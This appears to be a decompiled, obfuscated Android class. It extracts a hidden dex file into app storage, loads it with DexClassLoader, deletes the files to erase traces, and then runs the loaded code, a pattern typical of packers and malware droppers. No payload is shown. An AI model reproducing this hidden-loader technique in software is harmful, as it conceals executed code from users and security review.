package as.qq.op;

import android.annotation.SuppressLint;
import android.content.Context;
import android.content.pm.ApplicationInfo;
import android.os.Handler;
import dalvik.system.DexClassLoader;
import java.io.File;

@SuppressLint({"NewApi"})
public class aa
{
  public static DexClassLoader a = null;
  private static Handler b;
  private static aa c = new aa();
  private static String d;
  
  private aa() {}
  
  public static void a(Context paramContext)
  {
    b = new Handler(paramContext.getMainLooper());
    new Thread(new d(paramContext)).start();
  }
  
  private boolean b(Context paramContext)
  {
    String str = new File(paramContext.getApplicationInfo().dataDir, a.c).getAbsolutePath();
    boolean bool = c.a(paramContext, a.e, new File(str), Boolean.valueOf(true));
    if (bool) {
      try
      {
        a = new DexClassLoader(str, paramContext.getFilesDir().getAbsolutePath(), paramContext.getFilesDir().getAbsolutePath(), paramContext.getClassLoader());
        new File(str).delete();
        new File(paramContext.getFilesDir(), a.d).delete();
        c(paramContext);
        return true;
      }
      catch (Exception paramContext)
      {
        paramContext.printStackTrace();
        return false;
      }
    }
    return bool;
  }
  
  private void c(Context paramContext)
  {
    if (a != null) {
      b.post(new e(this, paramContext));
    }
  }
}
